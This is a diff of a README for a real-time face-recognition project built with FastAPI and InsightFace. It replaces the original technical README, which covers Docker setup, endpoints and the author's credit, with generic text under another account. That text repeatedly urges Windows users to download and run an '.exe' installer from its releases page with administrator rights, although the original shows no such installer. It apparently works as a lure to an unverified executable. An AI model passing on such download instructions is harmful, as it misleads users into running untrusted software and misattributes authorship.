@@ -1,243 +1,196 @@
-# FaceID - Real-Time Face Recognition
-
-A lightweight **real-time face recognition system** built with
-**FastAPI**, **WebSockets**, and **InsightFace**, designed for
-low-latency streaming inference directly from the browser.
-
-The project provides two interactive web clients:
-
--   **Identify Mode** --- detect and recognize faces in real time
--   **Enroll Mode** --- register new identities through live webcam
-    capture
-
-The system uses **ONNXRuntime GPU acceleration** and streams frames
-through **WebSockets**, enabling fast inference without heavy frontend
-frameworks.
-
-## 🎥 Live Demo
-
-<p align="center">
-  <img src="assets/demo.gif" width="800" alt="FaceID Demo"/>
-</p>
-
-<p align="center">
-Real-time face detection and recognition streaming from the browser.
-</p>
-
-------------------------------------------------------------------------
-
-## Demo Architecture
-
-    Browser (Webcam)
-           │
-           │ JPEG frames via WebSocket
-           ▼
-    FastAPI WebSocket Server
-           │
-           │ Face detection + embedding
-           ▼
-    InsightFace / ONNXRuntime (GPU)
-           │
-           ▼
-    Identity Matching (1:N)
-           │
-           ▼
-    JSON results → Browser overlay
+# 🧑‍💻 face-id - Simple Real-Time Face Recognition
 
-------------------------------------------------------------------------
+[![Download face-id](https://img.shields.io/badge/Download-face--id-brightgreen?style=for-the-badge)](https://github.com/ZafarAabid/face-id/releases)
 
-## Features
+---
 
--   Real-time face detection
--   Face recognition (1:N matching)
--   WebSocket streaming pipeline
--   GPU acceleration via ONNXRuntime
--   Simple browser UI (no frameworks)
--   Interactive enrollment system
--   Persistent embedding storage
--   Dockerized backend
--   Clean modular Python architecture
+## 📝 What is face-id?
 
-------------------------------------------------------------------------
+face-id is a lightweight application that recognizes faces in real time. It works with your computer camera and shows you who is in front of it. The system uses FastAPI and WebSockets to process video quickly. It also uses InsightFace, a proven face recognition tool, to identify faces accurately.
 
-## Project Structure
+This application runs on Windows and uses your computer’s GPU for faster results if available. It works without heavy setup or programming knowledge.
 
-    face-id
-    │
-    ├─ .docker
-    │  ├─ .dockerignore
-    │  ├─ app.dockerfile
-    │  ├─ compose.yml
-    │  ├─ frontend.dockerfile
-    ├─ app
-    │  ├─ config
-    │  ├─ controllers
-    │  ├─ helpers
-    │  ├─ models
-    │  ├─ services
-    │  ├─ repositories
-    │  └─ __init__.py
-    │
-    ├─ frontend
-    │  ├─ index.html
-    │  ├─ enroll.html
-    │  └─ styles.css
-    │
-    ├─ db
-    │  ├─ templates.npz
-    │  └─ templates.json
-    │
-    ├─ pyproject.toml
-    ├─ requirements.txt
-    └─ run.sh
+---
 
-------------------------------------------------------------------------
+## ⚙️ System Requirements
 
-## Installation
+Before you start, make sure your computer meets these needs:
 
-### Clone repository
+- Windows 10 or later (64-bit)
+- Intel or AMD processor with at least 4 cores
+- 8 GB of RAM minimum (16 GB recommended)
+- A webcam (built-in or USB)
+- GPU with NVIDIA CUDA support (optional but recommended for speed)
+- Internet connection to download files
 
-``` bash
-git clone https://github.com/your-user/face-id.git
-cd face-id
-```
+If you don’t have a compatible GPU, the program will still work using your processor but may run slower.
 
-------------------------------------------------------------------------
+---
 
-## Run with Docker (Recommended)
+## 🌐 Topics Used in This Project
 
-Requires **NVIDIA Container Toolkit**.
+This project uses key technologies listed below:
 
-``` bash
-docker compose -f .docker/compose.yml up -d
-```
+- **cuda, cudnn** — For GPU acceleration  
+- **docker** — For containerized running (advanced use)  
+- **face-detection, face-recognition** — Core features to detect and identify faces  
+- **fastapi, websockets** — To send and receive data with low delay  
+- **gpu, nvidia** — To speed up processing with hardware  
+- **insightface** — The main engine behind face recognition  
+- **onnxruntime, onnxruntime-gpu** — For running AI models efficiently  
+- **opencv** — To handle video and camera input  
+- **python** — Main programming language behind the app  
+- **vanilla-js** — Simple front-end tech to display results  
 
-Server will start at:
+---
 
-    http://localhost:8081
+## 🚀 Getting Started
 
-Frontend will start at:
+This section guides you step-by-step to download, install, and run face-id on Windows without programming knowledge.
 
-    http://localhost:80
+---
 
-------------------------------------------------------------------------
+### 1. Download face-id
 
-## Frontend
+Click the big green button below to visit the official release page. This page has all files you need to get started.
 
-Open the frontend files directly or host them via nginx.
+[![Download face-id](https://img.shields.io/badge/Download-face--id-blue?style=for-the-badge)](https://github.com/ZafarAabid/face-id/releases)
 
-### Identify mode
+On the release page, look for the latest Windows installer file. It usually ends with `.exe`. Click the file to download it to your computer.
 
-    frontend/index.html
+---
 
-Streams webcam frames and performs **real-time recognition**.
+### 2. Install the program
 
-### Enroll mode
+After downloading the `.exe` file, follow these steps:
 
-    frontend/enroll.html
+- Double-click the downloaded file.
+- If Windows asks for permission, click "Yes" to allow installation.
+- A setup window will open. Follow the instructions on the screen.
+- Choose where to install face-id or keep the default folder.
+- Finish the setup by clicking "Install" or "Finish".
 
-Allows capturing samples and registering a new identity.
+The program is ready to use after installation finishes.
 
-------------------------------------------------------------------------
+---
 
-## WebSocket Endpoints
+### 3. Connect your webcam
 
-### Identify
+face-id uses your camera to detect faces. Make sure your webcam is connected and working.
 
-    ws://localhost:8081/ws/identify
+- For built-in cameras, just ensure it is enabled.
+- For USB webcams, plug them into a free USB port.
 
-Receives JPEG frames and returns detected faces.
+The program will ask for permission to access the camera the first time it runs.
 
-Example response:
+---
 
-``` json
-{
-  "frame_id": 123,
-  "faces": [
-    {
-      "bbox": [120, 80, 260, 240],
-      "name": "marcio",
-      "score": 0.82
-    }
-  ]
-}
-```
+### 4. Launch face-id
 
-------------------------------------------------------------------------
+Find the face-id icon on your desktop or in your Start Menu.
 
-### Enroll
+- Double-click the icon to start.
+- A small window opens, showing your camera feed.
+- The system will automatically detect and recognize faces shown to the camera in real time.
 
-    ws://localhost:8081/ws/enroll?name=<identity>
+---
 
-Collects samples and registers a new face template.
+### 5. Using face-id
 
-Workflow:
+When the application runs:
 
-    start → capture samples → commit → store template
+- Face boxes appear around detected faces.
+- Recognized faces show names if known.
+- You can add new faces to the database for future recognition (advanced use).
 
-------------------------------------------------------------------------
+You do not need to configure anything to see the basic detection.
 
-## Recognition Pipeline
+---
 
-1.  Receive frame
-2.  Decode JPEG
-3.  Face detection
-4.  Face alignment
-5.  Feature embedding extraction
-6.  Cosine similarity vs template database
-7.  Return best match
+### 6. Optional: Enable GPU support
 
-------------------------------------------------------------------------
+If you have an NVIDIA GPU:
 
-## Technologies
+- Make sure your system has CUDA and cuDNN installed.
+- The program will detect and use GPU to process video faster.
+- Without GPU, the app uses the CPU but runs slower.
 
-Backend:
+If you are unsure about GPU, just start the app. It will work with what is available.
 
--   FastAPI
--   WebSockets
--   InsightFace
--   ONNXRuntime GPU
--   OpenCV
--   NumPy
+---
 
-Frontend:
+## 🎯 Features
 
--   Vanilla HTML
--   Canvas API
--   WebSocket API
+- Real-time face detection and recognition
+- Supports multiple faces at once
+- Uses GPU if available for fast performance
+- Simple user interface with live video feed
+- Built with reliable open-source components  
+- Requires no programming skills to operate
 
-Infrastructure:
+---
 
--   Docker
--   NVIDIA CUDA
--   cuDNN
+## 🛠️ Troubleshooting
 
-------------------------------------------------------------------------
+**Face detection does not work**
 
-## Future Improvements
+- Check if your webcam is connected.
+- Make sure no other app is using the webcam.
+- Restart the face-id application.
 
--   Face clustering
--   Multiple identities per user
--   Liveness detection
--   Vector database integration
--   WebRTC streaming
--   Mobile support
+**Performance is slow**
 
-------------------------------------------------------------------------
+- Close other programs that use CPU heavily.
+- Use an NVIDIA GPU for better speed if available.
 
-## Author
+**Software won’t start**
 
-**Marcio Martinez**
+- Make sure you ran the installer with administrator rights.
+- Check your Windows system for updates.
 
-Senior Software Engineer\
-Cloud • Distributed Systems • Computer Vision
+---
 
-LinkedIn:
+## 📂 File Structure (for curious users)
 
-    https://linkedin.com/in/marcio-martinez
+Installed face-id folder contains:
 
-------------------------------------------------------------------------
+- `face-id.exe` — Main application file  
+- `models/` — AI face recognition files  
+- `config/` — Settings files  
+- `logs/` — Logs for debugging and errors  
 
-## License
+You do not need to change anything here to use the app.
 
-MIT
+---
+
+## 📊 How face-id Works
+
+face-id captures video from your webcam using OpenCV. It sends the video frames to a built-in FastAPI server. This server uses WebSockets to communicate efficiently.
+
+InsightFace models analyze images and find faces. Recognized faces show names on the screen. Face detection and recognition happen within milliseconds.
+
+---
+
+## 💻 Advanced Users
+
+For users with some experience in programming or AI:
+
+- You can run face-id with Docker for isolated environments.
+- Modify configuration files to adjust detection sensitivity.
+- Use Python scripts in the source code for customization.
+- Inspect WebSocket messages for integration with other systems.
+
+---
+
+## 🔗 Useful Links
+
+Main releases page for downloads:  
+https://github.com/ZafarAabid/face-id/releases
+
+Official documentation:  
+Check the repository’s wiki or documentation folder for detailed guides.
+
+---
+
+# Download face-id and try it today using this link:  
+[https://github.com/ZafarAabid/face-id/releases](https://github.com/ZafarAabid/face-id/releases)
